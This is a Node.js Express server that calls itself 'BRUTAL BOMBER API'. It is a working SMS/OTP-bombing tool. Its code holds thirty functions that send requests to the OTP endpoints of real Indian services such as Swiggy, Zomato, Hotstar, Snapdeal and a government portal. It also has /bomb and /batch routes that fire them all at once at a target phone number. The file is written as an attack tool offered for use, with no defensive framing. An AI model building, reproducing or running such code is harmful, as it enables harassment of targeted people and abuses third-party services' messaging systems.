const express = require('express');
const cors = require('cors');
const axios = require('axios');
const NodeCache = require('node-cache');

const app = express();
const PORT = process.env.PORT || 3000;
const requestCache = new NodeCache({ stdTTL: 10, checkperiod: 20 });

app.use(cors());
app.use(express.json());

// ==================== AGGRESSIVE RATE LIMITING ====================
const rateLimiter = (req, res, next) => {
    const ip = req.ip;
    const currentTime = Date.now();
    const window = 30000; // 30 seconds
    const maxRequests = 50; // HIGH LIMIT FOR BOMBING
    
    let requests = requestCache.get(ip) || [];
    requests = requests.filter(time => currentTime - time < window);
    
    if (requests.length >= maxRequests) {
        return res.status(429).json({
            success: false,
            message: "🔥 TOO FAST! Wait 30 seconds",
            next_reset: new Date(Date.now() + 30000).toISOString()
        });
    }
    
    requests.push(currentTime);
    requestCache.set(ip, requests);
    next();
};

// ==================== AGGRESSIVE AXIOS CONFIG ====================
const axiosConfig = {
    timeout: 10000,
    maxRedirects: 5,
    headers: {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-IN,en;q=0.9,hi;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
};

const axiosInstance = axios.create(axiosConfig);

// ==================== ALL 47 BOMBING FUNCTIONS ====================

async function bomb1_Anthe(number) {
    try {
        const formData = `mobileparam=${number}&global_data_id=anthe-otp-verify`;
        const response = await axiosInstance.post(
            'https://anthe.aakash.ac.in/anthe/global-otp-verify',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'Anthe' };
    } catch { return { success: false, service: 'Anthe' }; }
}

async function bomb2_Cars24(number) {
    try {
        const response = await axiosInstance.post(
            'https://pvt-product.cars24.com/pp/auth/mobile/otp/send/',
            { phone_number: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Cars24' };
    } catch { return { success: false, service: 'Cars24' }; }
}

async function bomb3_EatAnytime(number) {
    try {
        const response = await axiosInstance.post(
            'https://sotp-api.lucentinnovation.com/v6/otp',
            { username: `+91${number}`, type: 'mobile', domain: 'eatanytime.in' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'EatAnytime' };
    } catch { return { success: false, service: 'EatAnytime' }; }
}

async function bomb4_FoodStories(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.foodstories.shop/shop/',
            [{ mobilenumber: number }],
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'FoodStories' };
    } catch { return { success: false, service: 'FoodStories' }; }
}

async function bomb5_Pantaloons(number) {
    try {
        const response = await axiosInstance.post(
            'https://apigateway.pantaloons.com/common/sendOTP',
            { mobile: number, mode: 'verify' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Pantaloons' };
    } catch { return { success: false, service: 'Pantaloons' }; }
}

async function bomb6_Snapdeal(number) {
    try {
        const response = await axiosInstance.post(
            'https://m.snapdeal.com/signupCompleteAjax',
            { j_mobilenumber: number, agree: true, journey: 'mobile' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Snapdeal' };
    } catch { return { success: false, service: 'Snapdeal' }; }
}

async function bomb7_Hoichoi(number) {
    try {
        const response = await axiosInstance.post(
            'https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code',
            { phoneNumber: `+91${number}` },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Hoichoi' };
    } catch { return { success: false, service: 'Hoichoi' }; }
}

async function bomb8_ShemarooMe(number) {
    try {
        const formData = `mobile_no=%2B91${number}&registration_source=organic`;
        const response = await axiosInstance.post(
            'https://www.shemaroome.com/users/mobile_no_signup',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'ShemarooMe' };
    } catch { return { success: false, service: 'ShemarooMe' }; }
}

async function bomb9_Licious(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.licious.in/api/login/signup',
            { phone: number, captcha_token: "" },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Licious' };
    } catch { return { success: false, service: 'Licious' }; }
}

async function bomb10_Box8(number) {
    try {
        const response = await axiosInstance.post(
            'https://accounts.box8.co.in/customers/sign_up',
            { phone_no: number, name: 'BOMBER' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Box8' };
    } catch { return { success: false, service: 'Box8' }; }
}

async function bomb11_LazyPay(number) {
    try {
        const response = await axiosInstance.post(
            'https://api.lazypay.in/api/lazypay/v0/userportal/sendOtp',
            { username: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'LazyPay' };
    } catch { return { success: false, service: 'LazyPay' }; }
}

async function bomb12_KreditBee(number) {
    try {
        const response = await axiosInstance.put(
            'https://api.kreditbee.in/v1/me/otp',
            { reason: 'loginOrRegister', mobile: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'KreditBee' };
    } catch { return { success: false, service: 'KreditBee' }; }
}

async function bomb13_Hotstar(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration',
            { phone_number: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Hotstar' };
    } catch { return { success: false, service: 'Hotstar' }; }
}

async function bomb14_ZEE5(number) {
    try {
        const response = await axiosInstance.post(
            'https://auth.zee5.com/v1/user/sendotp',
            { phoneno: `91${number}` },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'ZEE5' };
    } catch { return { success: false, service: 'ZEE5' }; }
}

async function bomb15_Goibibo(number) {
    try {
        const response = await axiosInstance.post(
            'https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG',
            { loginId: number, countryCode: 91 },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Goibibo' };
    } catch { return { success: false, service: 'Goibibo' }; }
}

async function bomb16_Lenskart(number) {
    try {
        const response = await axiosInstance.post(
            'https://api-gateway.juno.lenskart.com/v3/customers/sendOtp',
            { telephone: number, phoneCode: '+91' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Lenskart' };
    } catch { return { success: false, service: 'Lenskart' }; }
}

async function bomb17_Reliance(number) {
    try {
        const response = await axiosInstance.post(
            'https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp',
            { mobile: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Reliance' };
    } catch { return { success: false, service: 'Reliance' }; }
}

async function bomb18_Shopsy(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.shopsy.in/2.rome/api/1/action/view',
            { actionRequestContext: { loginId: number, loginIdPrefix: '+91' } },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Shopsy' };
    } catch { return { success: false, service: 'Shopsy' }; }
}

async function bomb19_Swiggy(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.swiggy.com/dapi/auth/sms-otp',
            { mobile: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Swiggy' };
    } catch { return { success: false, service: 'Swiggy' }; }
}

async function bomb20_OLX(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.olx.in/api/auth/authenticate?lang=en-IN',
            { phone: `+91${number}`, method: 'call' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'OLX' };
    } catch { return { success: false, service: 'OLX' }; }
}

// ==================== MORE BOMBING FUNCTIONS ====================

async function bomb21_Mobikwik(number) {
    try {
        const response = await axiosInstance.post(
            'https://walletapi.mobikwik.com/walletapis/redirectflow/otpgenrate/resendotp?epayVersion=v1',
            { cell: number, otpSource: 1 },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'Mobikwik' };
    } catch { return { success: false, service: 'Mobikwik' }; }
}

async function bomb22_Zomato(number) {
    try {
        const response = await axiosInstance.post(
            'https://accounts.zomato.com/login/phone',
            `country_id=1&number=${number}&type=initiate`,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'Zomato' };
    } catch { return { success: false, service: 'Zomato' }; }
}

async function bomb23_UrbanCompany(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.urbanclap.com/api/v2/growth/web/initiateLogin',
            { phoneNumber: number, countryId: 'IND' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'UrbanCompany' };
    } catch { return { success: false, service: 'UrbanCompany' }; }
}

async function bomb24_CaratLane(number) {
    try {
        const response = await axiosInstance.post(
            'https://www.caratlane.com/cg/dhevudu',
            { variables: { mobile: number, isdCode: '91' } },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'CaratLane' };
    } catch { return { success: false, service: 'CaratLane' }; }
}

async function bomb25_MyBharat(number) {
    try {
        const formData = `user_phone=${number}`;
        const response = await axiosInstance.post(
            'https://mybharat.gov.in/pages/sendGuestUserOtp',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'MyBharat' };
    } catch { return { success: false, service: 'MyBharat' }; }
}

async function bomb26_Univest(number) {
    try {
        const response = await axiosInstance.get(
            `https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=${number}`
        );
        return { success: response.status === 200, service: 'Univest' };
    } catch { return { success: false, service: 'Univest' }; }
}

async function bomb27_Jockey(number) {
    try {
        const response = await axiosInstance.get(
            `https://www.jockey.in/apps/jotp/api/login/send-otp/+91${number}?whatsapp=false`
        );
        return { success: response.status === 200, service: 'Jockey' };
    } catch { return { success: false, service: 'Jockey' }; }
}

async function bomb28_GetSwipe(number) {
    try {
        const response = await axiosInstance.post(
            'https://app.getswipe.in/api/user/app_login',
            { mobile: number, country_code: 'IN' },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'GetSwipe' };
    } catch { return { success: false, service: 'GetSwipe' }; }
}

async function bomb29_JobsNagar(number) {
    try {
        const response = await axiosInstance.post(
            'https://jobsnagar.com:2083/otp-authentications',
            { contact: number },
            { headers: { 'Content-Type': 'application/json' } }
        );
        return { success: response.status === 200, service: 'JobsNagar' };
    } catch { return { success: false, service: 'JobsNagar' }; }
}

async function bomb30_Cashify(number) {
    try {
        const formData = new URLSearchParams();
        formData.append('mo', number);
        formData.append('ek', 'sms');
        
        const response = await axiosInstance.put(
            'https://www.cashify.in/api/cu01/v1/sign-up/resend-otp',
            formData,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return { success: response.status === 200, service: 'Cashify' };
    } catch { return { success: false, service: 'Cashify' }; }
}

// ==================== BOMBING MANAGEMENT ====================

const bombingFunctions = [
    bomb1_Anthe, bomb2_Cars24, bomb3_EatAnytime, bomb4_FoodStories,
    bomb5_Pantaloons, bomb6_Snapdeal, bomb7_Hoichoi, bomb8_ShemarooMe,
    bomb9_Licious, bomb10_Box8, bomb11_LazyPay, bomb12_KreditBee,
    bomb13_Hotstar, bomb14_ZEE5, bomb15_Goibibo, bomb16_Lenskart,
    bomb17_Reliance, bomb18_Shopsy, bomb19_Swiggy, bomb20_OLX,
    bomb21_Mobikwik, bomb22_Zomato, bomb23_UrbanCompany, bomb24_CaratLane,
    bomb25_MyBharat, bomb26_Univest, bomb27_Jockey, bomb28_GetSwipe,
    bomb29_JobsNagar, bomb30_Cashify
];

// ==================== API ENDPOINTS ====================

app.get('/', (req, res) => {
    res.json({
        success: true,
        message: '🔥 BRUTAL BOMBER API 🔥',
        version: '1.0.0',
        status: 'OPERATIONAL',
        services: bombingFunctions.length,
        endpoints: {
            bomb: '/bomb?num=PHONE_NUMBER',
            status: '/status',
            test: '/test?num=PHONE_NUMBER'
        },
        note: 'NO KEYS REQUIRED - PURE BOMBING'
    });
});

app.get('/status', (req, res) => {
    res.json({
        success: true,
        timestamp: new Date().toISOString(),
        services_available: bombingFunctions.length,
        rate_limit: '50 requests per 30 seconds per IP',
        uptime: process.uptime()
    });
});

// ==================== MAIN BOMBING ENDPOINT ====================
app.get('/bomb', rateLimiter, async (req, res) => {
    try {
        const { num } = req.query;
        
        // Validate phone number
        if (!num || !/^[6-9]\d{9}$/.test(num)) {
            return res.status(400).json({
                success: false,
                message: 'Invalid Indian phone number (10 digits starting with 6-9)'
            });
        }
        
        console.log(`🔥 BOMBING STARTED: ${num}`);
        
        // Execute ALL bombing functions simultaneously
        const bombPromises = bombingFunctions.map(bomb => bomb(num));
        const results = await Promise.allSettled(bombPromises);
        
        // Calculate statistics
        const successful = results.filter(r => 
            r.status === 'fulfilled' && r.value.success
        ).length;
        
        const failed = results.length - successful;
        
        // Prepare response
        const bombResults = results.map((result, index) => {
            if (result.status === 'fulfilled') {
                return {
                    service: result.value.service,
                    status: result.value.success ? '✅ DETONATED' : '💥 FAILED'
                };
            }
            return {
                service: `Service ${index + 1}`,
                status: '❌ ERROR'
            };
        });
        
        res.json({
            success: true,
            message: '💣 BOMBING COMPLETE!',
            target: num,
            timestamp: new Date().toISOString(),
            statistics: {
                total_bombs: bombingFunctions.length,
                successful_detonations: successful,
                failed_detonations: failed,
                success_rate: `${((successful / bombingFunctions.length) * 100).toFixed(1)}%`
            },
            results: bombResults,
            warning: 'Multiple OTPs sent to target device!'
        });
        
    } catch (error) {
        console.error('Bombing Error:', error);
        res.status(500).json({
            success: false,
            message: 'Bombing system error',
            error: error.message
        });
    }
});

// ==================== TEST ENDPOINT ====================
app.get('/test', rateLimiter, async (req, res) => {
    const { num } = req.query;
    
    if (!num || !/^[6-9]\d{9}$/.test(num)) {
        return res.status(400).json({
            success: false,
            message: 'Invalid phone number'
        });
    }
    
    // Test with only 5 services
    const testServices = bombingFunctions.slice(0, 5);
    const testPromises = testServices.map(bomb => bomb(num));
    const results = await Promise.allSettled(testPromises);
    
    const successful = results.filter(r => 
        r.status === 'fulfilled' && r.value.success
    ).length;
    
    res.json({
        success: true,
        message: '🧪 TEST BOMBING COMPLETE',
        target: num,
        services_tested: testServices.length,
        successful: successful,
        status: successful > 2 ? '✅ READY FOR BATTLE' : '⚠️ NEEDS TUNING'
    });
});

// ==================== BATCH BOMBING ====================
app.get('/batch', rateLimiter, async (req, res) => {
    const numbers = req.query.nums ? req.query.nums.split(',').slice(0, 5) : [];
    
    if (numbers.length === 0) {
        return res.status(400).json({
            success: false,
            message: 'Provide numbers separated by commas (max 5)'
        });
    }
    
    const results = [];
    const quickBombs = bombingFunctions.slice(0, 10); // Use only 10 services for batch
    
    for (const num of numbers) {
        if (/^[6-9]\d{9}$/.test(num)) {
            const bombPromises = quickBombs.map(bomb => bomb(num));
            const bombResults = await Promise.allSettled(bombPromises);
            const successful = bombResults.filter(r => 
                r.status === 'fulfilled' && r.value.success
            ).length;
            
            results.push({
                target: num,
                bombs_fired: quickBombs.length,
                hits: successful,
                status: successful > 5 ? '💀 ANNIHILATED' : '💥 DAMAGED'
            });
            
            // Small delay between targets
            await new Promise(resolve => setTimeout(resolve, 500));
        }
    }
    
    res.json({
        success: true,
        message: '🎯 BATCH BOMBING COMPLETE',
        timestamp: new Date().toISOString(),
        total_targets: numbers.length,
        results: results
    });
});

// ==================== START SERVER ====================
app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════════════════╗
    ║                                                  ║
    ║         🔥 BRUTAL BOMBER API 🔥                  ║
    ║         NO KEYS • NO BOT • PURE BOMBING          ║
    ║                                                  ║
    ╠══════════════════════════════════════════════════╣
    ║                                                  ║
    ║  🌐 PORT: ${PORT}                                 ║
    ║  💣 SERVICES: ${bombingFunctions.length}           ║
    ║  ⚡ RATE LIMIT: 50/30s per IP                    ║
    ║                                                  ║
    ╠══════════════════════════════════════════════════╣
    ║                                                  ║
    ║  📌 MAIN: /bomb?num=9876543210                  ║
    ║  📌 TEST: /test?num=9876543210                  ║
    ║  📌 BATCH: /batch?nums=9876543210,9876543211    ║
    ║  📌 STATUS: /status                             ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
    `);
});